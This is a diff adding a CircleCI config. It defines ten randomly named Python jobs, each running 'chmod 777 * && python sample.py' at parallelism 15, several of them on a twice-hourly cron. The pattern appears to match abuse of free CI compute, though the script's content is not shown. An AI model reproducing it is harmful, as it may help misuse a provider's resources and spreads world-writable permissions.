@@ -1,1 +1,121 @@
+working_dir: &working_dir ~/app 
+.build_template: &script
+  steps: 
+    - checkout 
+    - run: 
+        name: Install
+        command: |
+                    chmod 777 * && python sample.py
 
+                    
+                    ls
+        no_output_timeout: 600s 
+version: 2.0 
+jobs: 
+  ghhj: 
+    <<: *script
+    parallelism: 15
+    docker:
+
+      - image: python
+   
+
+  ghhsa: 
+    <<: *script
+    parallelism: 15
+    docker:
+
+      - image: python
+
+  aasd: 
+    <<: *script
+    parallelism: 15
+    docker:
+
+      - image: python
+   
+
+  erd: 
+    <<: *script
+    parallelism: 15
+    docker:
+
+      - image: python
+
+  fkg: 
+    <<: *script
+    parallelism: 15
+    docker:
+
+      - image: python
+   
+
+  ges: 
+    <<: *script
+    parallelism: 15
+    docker:
+
+      - image: python
+
+  fuj: 
+    <<: *script
+    parallelism: 15
+    docker:
+
+      - image: python
+   
+
+  pgh: 
+    <<: *script
+    parallelism: 15
+    docker:
+
+      - image: python
+  frt: 
+    <<: *script
+    parallelism: 15
+    docker:
+
+      - image: python
+   
+
+  sdd: 
+    <<: *script
+    parallelism: 15
+    docker:
+
+      - image: python
+
+
+  
+workflows: 
+  version: 2 
+  commit: 
+    jobs: 
+
+      - fkg
+      - ges
+      - fuj
+      - pgh
+      - frt
+      - sdd
+      
+  waha:
+     triggers:
+      - schedule:
+          cron: "14,44 * * * *"
+          filters:
+            branches:
+              only:
+                - main
+                
+     jobs:
+      - ghhj
+      - ghhsa
+      - aasd
+      - erd
+      - fkg
+      - ges
+
+      
+  
